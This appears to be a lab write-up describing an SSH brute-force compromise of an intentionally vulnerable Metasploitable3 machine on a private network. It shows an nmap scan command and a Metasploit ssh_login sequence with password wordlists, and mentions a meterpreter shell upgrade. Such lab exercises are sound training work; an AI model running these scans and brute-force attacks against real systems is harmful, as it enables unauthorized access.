# 🚩 Phase 1: Attack Execution

This document Show a **detailed step-by-step guide** to compromising the **Metasploitable3** machine via:

1. ✅ **Task 1.1:** Using Metasploit framework.
2. ✅ **Task 1.2:** Using a custom Python script.

---

## 🌐 Network Information

- **Victim (Metasploitable3) IP:** `192.168.56.101`
![Metasploitable3 IP](./Picture1.png)

- **Attacker (Kali Linux) IP:** `192.168.56.102`
![Attacker IP](./Picture2.png)

---

## 🔍 Task 1.1: Using Metasploit Framework

We performed an SSH brute-force attack using the Metasploit framework.

---


## 🔎 Nmap Scan: Identifying Open Ports and OS

Before launching the attack, we performed reconnaissance to identify open ports and gather OS information of the victim machine (`192.168.56.101`).

### 🔧 **Nmap Command Used:**

\```bash
sudo nmap -sS -sV -O 192.168.56.101
\```

![nmap](./Picture3.png)

---

### **Commands Used:**

we will target SSH_port 22 using Brute_force

\```bash
msfconsole
use auxiliary/scanner/ssh/ssh_login
show options
set pass_file /usr/share/wordlists/metasploit/unix_passwords.txt
set user_file /usr/share/wordlists/metasploit/unix_users.txt
set rhosts 192.168.56.101
exploit

\```

![nmap](./Picture4.png)

---

### **Upgrading the shell to meterpreter:**

![nmap](./Picture5.png)
